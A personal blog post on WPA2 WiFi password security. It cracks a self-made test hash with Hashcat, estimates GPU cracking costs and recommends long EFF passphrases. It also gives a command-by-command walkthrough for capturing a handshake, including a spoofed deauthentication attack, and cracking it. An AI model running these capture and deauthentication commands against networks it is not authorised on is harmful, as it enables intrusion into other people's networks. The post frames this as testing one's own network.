---
title: "WiFi Passwords"
description: Notes on a short investigation into WiFi passwords.
---

My home WiFi network is secured with WPA2, which I got curious about. Here are some things I learned.

### Cracking a hashed WiFi password

WPA2 passwords are hashed with 4096 iterations of WPA-PBKDF2-PMKID+EAPO.
Mode `22000` of [Hashcat](https://hashcat.net/hashcat/) can crack these, but
they are tricky to generate outside of capturing packets (though see below for how to do that). For testing we can use
mode `12000`, which is generic PBKDF2 mode that roughly matches the relevant hash
process in WPA2. This is easy to generate with Ruby:

    # wifi_hash.rb
    require 'openssl'
    require 'base64'

    ssid = 'WiMCA'
    password = 'hunter2'

    pmk = OpenSSL::PKCS5.pbkdf2_hmac(password, ssid, 4096, 32, OpenSSL::Digest::SHA1.new)

    puts "sha1:4096:#{Base64.strict_encode64(ssid)}:#{Base64.strict_encode64(pmk)}"

Use Hashcat to test against the [RockYou](https://en.wikipedia.org/wiki/RockYou) breach list:

    hashcat -m 12000 -a 0 $(ruby wifi_hash.rb) ./rockyou.txt

Indeed, it is there!

    Session..........: hashcat
    Status...........: Cracked
    Hash.Mode........: 12000 (PBKDF2-HMAC-SHA1)
    Hash.Target......: sha1:4096:V2lNQ0E=:TA3GkTDp8116+ug28hQAyAYXNAOuAZn0...pV8wA=
    Time.Started.....: Wed Jan  7 10:30:33 2026 (1 sec)
    Time.Estimated...: Wed Jan  7 10:30:34 2026 (0 secs)
    Kernel.Feature...: Pure Kernel
    Guess.Base.......: File (./rockyou.txt)
    Guess.Queue......: 1/1 (100.00%)
    Speed.#1.........:     8334 H/s (7.45ms) @ Accel:256 Loops:256 Thr:1 Vec:4
    Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
    Progress.........: 11264/14344384 (0.08%)
    Rejected.........: 0/11264 (0.00%)
    Restore.Point....: 10240/14344384 (0.07%)
    Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:3840-4095
    Candidate.Engine.: Device Generator
    Candidates.#1....: vivien -> merda

    Started: Wed Jan  7 10:30:31 2026
    Stopped: Wed Jan  7 10:30:36 2026

(We could of course just use `grep` on the word list to check if a password is in there, but where is the fun in that?)

A dumb brute force of all seven letter lowercase letters and numbers starts getting harder:

    hashcat -m 12000 -a 3 ./testpwd -1 ?l?d ?1?1?1?1?1?1?1 --potfile-disable 

This estimates 108 days to complete. Adding an eigth character takes us out to 25,000 _years_.

    Time.Estimated...: Next Big Bang (25699 years, 279 days)
    Kernel.Feature...: Pure Kernel
    Guess.Mask.......: ?a?a?a?a?a?a?a?a [8]
    Guess.Queue......: 1/1 (100.00%)
    Speed.#1.........:     8180 H/s (7.58ms) @ Accel:64 Loops:1024 Thr:1 Vec:4
    Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
    Progress.........: 69376/6634204312890625 (0.00%)

But this is on a tiny computer. What would be feasible with more grunt? The time
estimate is simple math: keyspace size (the denominator on the "progress" line)
divided by hashes per second ("speed" line).

### Cost of cracking

Better computers, and specifically dedicated GPUs, can achieve far more hashes per second:

| System | Hash Rate (H/s) | Notes |
|--------|----------------|-------|
| VM on mini PC | 8,000 | CPU only |
| Desktop | 689,000 | GPU acceleration |
| [8x GPU](https://www.onlinehashcrack.com/tools-benchmark-hashcat-nvidia-rtx-4090.php) | 20,200,000 | Parallelized 8 GPU configuration |

The latter would reduce the time estimate from original 25,699 years to 14!  A
machine like that can be rented for about $5/hour. This could likely be
reduced by close to an order of magnitude on owned hardware, depending on
amortisation schedule.[^1] Using $1/hour, the above attack would cost about $100k.

For WiFi passwords specifically, I want to use a passphrase because they are
easier to communicate verbally and input on smart TVs. The EFF publishes a
[number of word lists appropriate for generating
passphrases](https://www.eff.org/deeplinks/2016/07/new-wordlists-random-passphrases)
that have some nice features: no homophones, no rare words, nothing
vulgar. These lists are designed to be used with six-sided dice – roll the dice,
look up the corresponding word. Of course, computers can do this more
efficiently:

    words = File.read("eff_large_wordlist.txt").line
    puts 6.times.map {  words[rand(6 ** 5)].split(/\t/)[1].chomp }.join(" ")
    # parmesan composer drool snowman case eloquence

Their "long list" is designed for five dice, and their "short list" is for four
and only contains five letter words.  Using the above assumptions, the cost of
attack for various numbers of words in millions of dollars:

|          | 3     | 4        | 5              | 6                    |
|----------|-------|----------|----------------|----------------------|
| **Short EFF** | 0.03  | 39       | 50,277         | 65,159,259           |
| **Long EFF** | 6.47  | 50,277   | 390,955,556    | 3,040,070,403,200    |

The EFF recommend using six words off the long list.

[^1]: Very approximate! I'm squinting at spot and hardware prices and rounding heavily.

### Capturing a hashed WiFi password

_Only do this on networks you own or have permission for!_

[This article](https://medium.com/@girishatindra/pi-fi-hacking-capturing-wpa-handshake-5d2787d0b7d0) was most helpful. Instructions below are mostly edited down from there.

Obtain a [WiFi device that supports monitor mode.](https://alfa-network.eu/awus036ach-c) The standard one in your computer probably doesn't --– you'll know when the instructions below fail and tell you so.

Installing AWUS036ACH drivers:

    # Verify it is recognised as USB device
    sudo apt install usbutils
    lsusb | grep Realtek
    # Bus 002 Device 002: ID 0bda:8812 Realtek Semiconductor Corp. RTL8812AU 802.11a/b/g/n/ac 2T2R DB WLAN Adapter

    # Install drivers
    sudo apt install build-essential dkms git linux-headers-$(uname -r)
    git clone https://github.com/aircrack-ng/rtl8812au.git
    cd rtl8812au   
    sudo make dkms_install
    sudo modprobe 88XXau

    # Verify it is working
    ip link show | grep wl
    # 4: wlx00cbab8e2: <BROADCAST,ALLMULTI,PROMISC,NOTRAILERS,UP,LOWER_UP> mtu 2312 qdisc mq state UP mode DEFAULT group default qlen 1000

Get aircrack installed and prepare interface:

    sudo apt install aircrack-ng

    sudo airmon-ng           # Confirm wifi device shows up
    export IF=wlx00cbab8e2   # Store interface ID
    sudo airmon-ng start $IF # Put interface in monitor mode

Find BSSID (MAC address) and CH (channel) of the relevant access point.  The
following command will passively monitor access points and clients to help
locate. (Also findable from access point settings, but assume we can't access those.)

    sudo airodump-ng $IF
    export BSSID=12:34:56:AB:CD:EF
    export CH=1

Start capturing traffic to that access point:

    sudo airodump-ng --bssid $BSSID -c $CH -w dumpfile $IF

Wait for an intitial four-way handshake to occur. You will known when
`EAPOL` shows in the `NOTES` field. You might be waiting a while! Most clients
perform fairly aggressive caching, such that disconnecting and reconnecting a
device likely won't trigger a handshake. Spoofing a deauthenticating packet will force one:

    sudo aireplay-ng --deauth 10 -a $BSSID $IF

After seeing `EAPOL`, kill the `airodump-ng` process and verify that the capture contains a hash:

    sudo aircrack-ng dumpfile.cap
    # Should show "1 potential targets" in output

Convert it to a format appropriate for hashcat, then crack it using mode 22000 using any method from above:

    sudo apt install hcxtools
    hcxpcapngtool -o hashedpassword.22000 dumpfile.cap

    hashcat -a 0 -m 22000 hashedpassword.22000 rockyou.txt

### Sharing WiFi passwords

[Delphi Tools QR Generator](https://tools.rmv.fyi/tools/qr-genny) can generate tasteful QR encodings of WiFi credentials. Verify with Developer Tools that it is all local and doesn't phone home.

![Example WiFi QR Code](/images/demo-wifi-qr-code.png)